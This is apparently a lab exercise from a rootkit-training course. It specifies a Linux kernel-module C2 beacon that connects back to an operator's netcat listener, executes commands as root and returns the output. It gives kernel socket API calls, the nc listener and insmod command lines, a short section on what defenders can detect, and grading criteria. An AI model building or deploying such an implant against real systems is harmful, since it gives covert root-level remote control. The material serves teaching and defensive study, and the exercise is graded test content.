# Capstone 4: Implant

Build a kernel-space C2 beacon. The module connects back to an operator
on load, receives commands, executes them, and sends results. The
classic callback shell, running inside the kernel.

```
  host (operator)                        guest VM (implant)
  +---------------------------+          +---------------------------+
  |                           |          |  insmod hello.ko          |
  |  1. start listener        |          |   target=10.0.2.2         |
  |  $ nc -l -p 4444          |          |   port=4444 interval=5    |
  |                           |          |     |                     |
  |                           |          |     v                     |
  |  2. beacon connects back  |  TCP     |  kthread: beacon loop    |
  |                           |<---------|     |                     |
  |  $ id                     |          |     v                     |
  |  uid=0(root)              |          |  recv cmd, exec, send    |
  |  $ uname -r               |          |  result via socket       |
  |  7.2.x                    |          |                          |
  |  $ exit                   |          |  close, wait, reconnect  |
  +---------------------------+          +---------------------------+

  timeline:
  insmod         connect         commands        exit        reconnect
  ---|------------|------------|---------|---------|---------->
     beacon loop  TCP session   exec      sleep(interval)
```

## Prerequisites

Lings 00 through 51 (foundation through networking).

## What you are building

A kernel thread that repeatedly tries to connect to the operator's
listener. On success, it receives commands line by line, executes them
with `call_usermodehelper` (ling 16), captures stdout, and sends results
back over the socket. On disconnect, it sleeps and reconnects.

- Module parameters: `target` (IP string), `port` (int), `interval` (reconnect delay).
- A kthread runs the beacon loop: connect, handle session, sleep, repeat.
- Each command is executed with `/bin/sh -c "CMD > /tmp/.rk_out 2>&1"`.
- Output is read back with `filp_open`/`kernel_read` and sent over the socket.
- `/proc/rk_shell` reports connection stats (target, port, interval, connections, commands).
- On unload, the thread stops cleanly via `kthread_stop`.

## Kernel TCP sockets

The kernel socket API mirrors userspace but uses different names:

```c
sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
kernel_connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
kernel_sendmsg(sock, &msg, &vec, 1, len);
kernel_recvmsg(sock, &msg, &vec, 1, 1, 0);
sock_release(sock);
```

`in_aton(target)` converts an IP string to network-byte-order `__be32`.

## What "done" looks like

Terminal 1 (host, start listener):
```sh
nc -l -p 4444
```

Terminal 2 (host, load module):
```sh
./rootkitlings run --network

# inside the VM
insmod hello.ko target=10.0.2.2 port=4444 interval=5
```

Terminal 1 (shell connects back):
```
id
uid=0(root) gid=0(root)
uname -r
7.2.x
exit
```

## What a defender sees

Everything leaks. This is the unarmored version.

```
lsmod                                        hello is listed
ps aux | grep rk_beacon                      kthread visible
ss -tlnp                                     TCP connection exposed
cat /proc/net/tcp                            socket in the table
tcpdump -i eth0                              traffic in cleartext
```

The killer move: capture traffic on the HOST side, outside the VM.
No kernel rootkit can touch packets after they leave the guest NIC.

## Contract

The check script verifies:

- Module loads with `target`, `port`, `interval` parameters.
- `/proc/rk_shell` exists and shows target, port.
- Beacon connects to a local listener.
- Commands sent by the listener are executed.
- Output of `id` contains `uid=0`.
- Connection and command counters increment.
- `/proc/rk_shell` disappears after unload.

## Verify

```bash
./rootkitlings check capstone-4
```

## Hints

Only if stuck. Try without them first.
